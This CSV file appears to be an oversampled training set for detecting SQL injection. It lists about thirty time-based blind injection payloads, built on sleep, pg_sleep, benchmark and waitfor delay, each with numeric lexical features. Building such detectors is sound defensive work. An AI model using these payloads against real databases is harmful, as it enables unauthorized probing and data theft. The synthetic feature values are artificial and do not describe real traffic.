id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000461,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,0.9644904664063141,38.58833035016472,16.0,3.217029257093407,15.786871643935308,1.1985412937705897,14.80145870622941,6.801458706229411,0.4047313068608411,0.030485103615223497,0.3866840942210315,0.178099495302904,0.0,3.1985412937705897,0.0,0.0,0.0,0.8014587062294102,0.0,1.9999999999999996,0.8014587062294101,0.0,0.0,0.8014587062294102,0.0,1.0,0.0,0.0,0.0,0.8014587062294102,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.8014587062294102,0.0,0.0,0.0,1.1985412937705897,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000462,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0,100.0,33.0,4.070862758735813,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0000000000000002,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0000000000000002,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000463,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,0.12199158661096693,55.95534964275881,23.93302446413822,4.011670751510156,26.910699285517627,3.9776748213794058,15.066975535861781,10.0,0.48088780411193754,0.07107420351395882,0.26931891050491985,0.1787190818691838,2.066975535861781,3.9106992855176266,0.0,0.0,0.0,0.022325178620593578,0.0,1.9999999999999996,0.0,0.0,0.0,0.022325178620593578,1.0,0.9776748213794064,0.0,0.0,0.0,0.02232517862059369,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000464,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",nearest_attack_euclidean,R000080,1.5313220058190251,75.62220914621942,26.501594773588906,3.685131145386195,18.250797386794453,20.87619608019168,28.371411759424966,8.123803919808323,0.24237778004414828,0.27744412887622694,0.3733831900312563,0.10679490104836842,0.3746013066027738,0.0,0.0,0.0,0.0,1.0,0.0,4.749202613205548,0.0,0.0,1.0,1.0,0.37460130660277396,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.6253986933972261,0.3746013066027739,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000465,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.5334528679318624,35.787392811271566,22.478739281127158,4.189582743509727,16.0,2.0,5.829914249017257,11.957478562254314,0.4558628757038984,0.056982859462987305,0.1503954021219448,0.3367588627111695,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.9574785622543143,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.4787392811271573,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000466,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.3006355020835594,41.57583329915917,16.0,2.8728693730491606,10.999999999999998,0.0,20.57583329915917,10.0,0.26515553590295116,-1.3877787807814457e-17,0.4937939769125478,0.24105048718450106,0.6439583247897926,0.7120833504204149,0.0,0.0,0.0,1.0,0.0,3.643958324789793,0.0,4.0,0.0,1.0,0.6439583247897924,0.3560416752102074,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000467,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,1.0714225488800244,86.86077610325032,26.713074632249896,3.47463139544061,18.00847757425073,21.57385073550021,37.13922389674969,10.139223896749687,0.2068143002003603,0.24827212765674958,0.4279153074466895,0.11699826469620064,0.713074632249896,0.0,0.0,0.0,0.0,1.0,0.0,6.713074632249896,0.0,0.0,1.0,1.0,0.7130746322498958,0.0,0.0,0.7130746322498959,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.28692536775010424,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2869253677501042
SMOTE_000468,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,1.208940084468984,67.82327197838116,18.860455013511782,2.820708274161274,10.999999999999998,10.0,36.279089972976436,10.544182005404712,0.16256019824688928,0.147781998406263,0.5332573077296244,0.15640049561722325,0.7720910027023561,0.0,0.0,0.0,0.0,1.0,0.0,6.455817994595288,0.7720910027023561,0.0,0.7720910027023562,1.0,0.772091002702356,0.0,0.0,0.7720910027023561,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.2279089972976438,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.227908997297644
SMOTE_000469,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,0.09716663263203734,78.86043593695976,17.916261562175855,2.9600989927946384,13.916261562175857,17.776697499135615,38.16747687564829,9.0,0.17641781736135068,0.2252602216158806,0.4841830495333123,0.1141389114894564,0.0,0.0,0.0,0.0,0.0,1.972087187391952,0.0,6.055825625216096,0.0,0.0,0.9720871873919522,1.972087187391952,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000470,attack,time,"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558",nearest_attack_euclidean,R000101,0.5669776777347161,98.45864313984131,21.11466078496033,2.717083414458423,12.747045938560092,16.988183754240374,56.22932156992066,12.494091877120187,0.13013199853142454,0.17124260286372212,0.5719116982009951,0.12671370040385824,0.0,0.0,0.0,0.0,0.0,1.8735229692800466,0.0,9.747045938560092,0.0,0.0,0.8735229692800468,1.8735229692800466,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.1264770307199532,0.8735229692800466,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000471,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.5839371641005535,53.416149684208136,17.97604276691661,3.3559093558485857,26.0,1.0,19.928128300749833,6.488021383458305,0.48883512568792575,0.01880135098799715,0.37099363873893093,0.12136988458514611,3.0,0.0,0.0,0.0,0.0,0.0,0.0,3.488021383458305,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000472,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,2.50022808745329,43.85879975526105,19.92939987763053,3.993521509217401,24.858799755261057,3.464699938815264,7.535300061184735,8.0,0.5658991694357971,0.07864440898781466,0.17267712449672384,0.18277929707966437,3.605900183554208,1.8587997552610562,0.0,0.0,0.0,0.5353000611847359,0.0,0.0,0.0,0.0,0.0,0.535300061184736,1.0,0.4646999388152641,0.0,0.0,0.0,0.5353000611847359,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000473,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,0.4364836307662154,32.202937413243156,11.775367176655394,2.389047126298128,6.775367176655394,2.0,18.65220305993236,4.775367176655394,0.2139573890744793,0.06469628296325769,0.5720852218510414,0.14926110611122162,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7753671766553936,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8876835883276968,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.8876835883276968,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.887683588327697
SMOTE_000474,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.0054060730971202,83.73261389589143,26.65842326301357,3.671062087183425,21.683153473972858,22.670788368493213,31.707883684932145,7.6707883684932145,0.2590350222530524,0.2725642673834683,0.37653688804105906,0.09186382232242028,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.341576736986429,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.32921163150678545,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.6707883684932145,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6707883684932145
SMOTE_000475,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,1.1880695417265745,77.29353134994679,16.976118809968078,2.792297643255956,12.976118809968076,15.269650159914873,40.047762380063844,9.0,0.16746560846531355,0.19620574723473017,0.5197774609522863,0.11655118334767,0.0,0.0,0.0,0.0,0.0,1.6587062699893589,0.0,6.682587460021282,0.0,0.0,0.6587062699893591,1.658706269989359,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000476,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000147,0.6866839151843164,87.86281241473992,23.755716149385837,3.2196272809027167,21.0,10.0,42.88567701228327,13.977135402456653,0.2419329198447379,0.11520615230701804,0.48387467133537865,0.15898625651286546,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.977135402456653,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000477,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,3.1259124261975897,62.056662564199094,26.90196362638914,4.041257713422972,23.41612926743891,3.6122020146606326,19.41612926743891,15.612202014660632,0.3721370651682106,0.05336899170833403,0.2976431220447552,0.2768508210787002,2.0,0.6775595970678733,2.0,0.0,0.0,0.0,1.0000000000000002,3.2897616117285065,0.0,2.7102383882714935,0.6448808058642534,2.6448808058642532,1.0,0.6775595970678734,1.0,0.0,0.0,0.0,1.0,1.0000000000000002,0.0,0.0,3.469446951953614e-18,0.3224404029321266,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3224404029321265,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6448808058642532
SMOTE_000478,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,1.1027369803918157,111.12220367273387,25.687033945455646,3.2305706864752235,36.46820626969826,8.249378593940861,53.279929512124326,13.12468929697043,0.3311808045489728,0.0709176891719777,0.47963409968583215,0.11826740659321727,0.7811723242426076,0.0,0.0,0.0,1.0,0.7811723242426076,0.0,9.562344648485215,0.0,0.0,0.0,1.7811723242426076,0.7811723242426076,0.0,0.0,1.0,0.0,0.7811723242426076,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.7811723242426076,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.781172324242608
SMOTE_000479,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.7187684960288165,57.157244815054106,20.0,3.1195196185157714,13.0,11.0,25.964370679211754,7.1928741358423505,0.2299857475497731,0.19460332484980802,0.45002375408371154,0.1253871735167074,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.1928741358423505,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000480,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,1.756595519328423,66.41771462807613,23.0,3.4234202130096336,19.0,10.0,28.952979787472074,8.464734840604056,0.2868624539833455,0.15098023893860288,0.4355463563838288,0.1266109506942228,0.0,1.0,0.976489893736037,0.0,0.0,1.0,0.0,4.488244946868019,0.0,1.0,0.0,1.9764898937360367,0.0,1.0,0.4882449468680185,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000481,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.2627900906486613,61.02909349929028,26.57662383915898,4.162363918101582,29.59117058880412,2.7153247678317953,15.007273374822569,13.715324767831795,0.47393867025532854,0.0449876735533839,0.24567241900842085,0.23540123718286676,3.4306495356635915,0.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,1.8540256965046127,1.0,3.4306495356635915,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.7153247678317958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7153247678317958
SMOTE_000482,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,4.351061500223698e-05,72.99991328146457,20.999990364607175,3.4285723477018335,22.00001927078565,9.999913281464575,29.999990364607175,10.999990364607175,0.30137057246899224,0.1369851320060506,0.4109593103964868,0.15068498512847034,3.999990364607175,0.0,0.0,0.0,0.0,1.999990364607175,0.0,4.000009635392825,0.0,9.635392824836053e-06,0.9999903646071752,1.999990364607175,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,9.635392824836053e-06,0.0,0.0,0.0,1.999990364607175,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999903646071752,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.999990364607175
SMOTE_000483,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,0.9031253722170495,96.26992559383723,26.216259300770346,3.59244158220776,25.35122209768896,19.70244419537792,38.216259300770346,13.0,0.26319747167049323,0.2039876523442692,0.39761181847048516,0.1352030575147524,3.783740699229653,0.0,0.0,0.0,0.0,1.7837406992296532,0.0,6.216259300770346,0.21625930077034683,0.0,1.0,1.7837406992296532,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.21625930077034689,0.0,0.0,0.0,1.0,0.7837406992296532,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000484,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,1.0636094282240522,77.4722980588092,17.08337883528552,2.8114419454989434,13.083378835285517,15.555676894094717,39.83324232942896,9.0,0.16848695777698036,0.19952054559954108,0.5157165271621859,0.1162759694612927,0.0,0.0,0.0,0.0,0.0,1.6944596117618396,0.0,6.611080776476321,0.0,0.0,0.6944596117618398,1.6944596117618396,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000485,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.4760014391820673,52.78470401631164,17.795629718946184,3.3643428634238703,26.0,1.0,19.38688915683855,6.397814859473092,0.4945956826582096,0.01902291087146961,0.3652647331805718,0.12111667328974902,3.0,0.0,0.0,0.0,0.0,0.0,0.0,3.397814859473092,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000486,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,1.2274560265849488,57.80618864177845,20.532301893036927,3.1052889301187725,13.0,10.0,26.806188641778448,8.0,0.2254901781391595,0.17345398318396885,0.46229265212969656,0.1387631865471751,0.0,0.5323018930369251,0.0,0.0,0.0,0.0,0.0,5.467698106963075,0.0,0.0,1.0,0.0,0.0,0.532301893036925,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000487,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.11434630693476255,38.600526458986884,17.0,3.307283902989729,13.0,0.0,14.5147369648459,11.085789494140982,0.3375398573293395,-1.3877787807814457e-17,0.37494306095808644,0.28751708171257406,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0857894941409834,0.0,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000488,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,1.7040659569262127,41.21758157580645,17.87448070035842,3.3411211200351105,17.280341225627236,1.4686201750896046,15.468620175089606,7.0,0.4149979337760972,0.0347364071107573,0.37842257511234945,0.17184308400079606,0.0,3.4686201750896055,0.0,0.0,0.0,1.0,0.0,1.9999999999999996,0.5313798249103949,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.5313798249103949,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.531379824910395
SMOTE_000489,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.4240253254315188,36.08105513907166,17.0,3.3963181848948905,13.0,0.0,12.464844111257332,10.616211027814332,0.3619986309346638,-1.3877787807814457e-17,0.3433248040516549,0.29467656501368134,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.6162110278143325,0.0,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000490,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,1.345732398803179,43.0004875419547,19.50024377097735,3.9371776436186776,24.000487541954694,3.2501218854886735,7.749878114511326,8.0,0.5574582108163246,0.07531245163802289,0.18089595262621017,0.18633338491944224,4.2496343435339785,1.000487541954696,0.0,0.0,0.0,0.749878114511326,0.0,0.0,0.0,0.0,0.0,0.749878114511326,1.0,0.25012188548867387,0.0,0.0,0.0,0.749878114511326,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000491,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.099522958033038,80.69806499191357,25.446537666127572,3.6316355444482813,22.169806499191356,20.786150664510288,30.57230132902057,7.169806499191357,0.28071934557494166,0.2572675517667879,0.37354838003539437,0.08846472262287607,0.0,0.0,0.0,0.0,0.0,0.7232688330637856,0.0,5.446537666127572,0.0,0.0,1.0,0.7232688330637858,0.0,0.0,0.0,0.0,0.0,0.7232688330637859,1.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.7232688330637858,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.723268833063786
